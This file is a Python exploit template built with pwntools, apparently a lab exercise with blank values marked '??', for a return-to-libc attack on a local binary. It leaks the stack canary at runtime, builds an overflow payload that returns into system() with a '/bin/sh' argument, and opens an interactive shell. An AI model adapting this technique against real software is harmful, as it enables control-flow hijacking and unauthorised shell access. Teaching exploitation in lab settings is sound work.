from pwn import *

# Number of bytes required to reach Return Address
BUF_SIZE = ??
log.info(f"Bytes until return address: {BUF_SIZE}")

# Number of bytes that our input buffer is
INPUT_SIZE = ??
log.info(f"Bytes for input: {INPUT_SIZE}")

# Address we want to return to
system_returnAddress = p32(0x????????) # Address of 'system()' obtained from GDB

# Addr of '/bin/sh' in libc - Placing '/bin/sh' on the stack does not work
command_str_addr = p32(0xf7f55363) 

# Address of 'exit()' - you can ignore this
exit_addr = p32(0x????????)

# Ignore this
junk = b"BBBB"

# Special file name that will leak canary and hold our exploit
special_file = "?"

# ==== You can ignore this part ====
# We need to leak and save the canary value at runtime because it is different each time we execute 'readBinaryData0'
pty = process.PTY
io = process(argv=["./readBinaryData0", special_file], stdin=pty, stdout=pty)

# Get the canary
canary = io.recv().split(b"0x41414141")[-1].split(b".")[1].decode()
log.info(f"Canary found! {canary}")
# ==== You can ignore this part ====

# Crafting the final exploit!
exploit = b''
exploit += b"A" * (INPUT_SIZE)
exploit += p32(int(canary,16))
exploit += b"A" * (BUF_SIZE - INPUT_SIZE - 4) # '4' is the number of bytes the canary takes up
exploit += system_returnAddress
exploit += junk
exploit += command_str_addr

# Write exploit to a file as bytes (wb)
with open(special_file, "wb") as fd:
    fd.write(exploit)

# Continue program execution to make it read the file with our exploit!
io.sendline()
io.interactive()


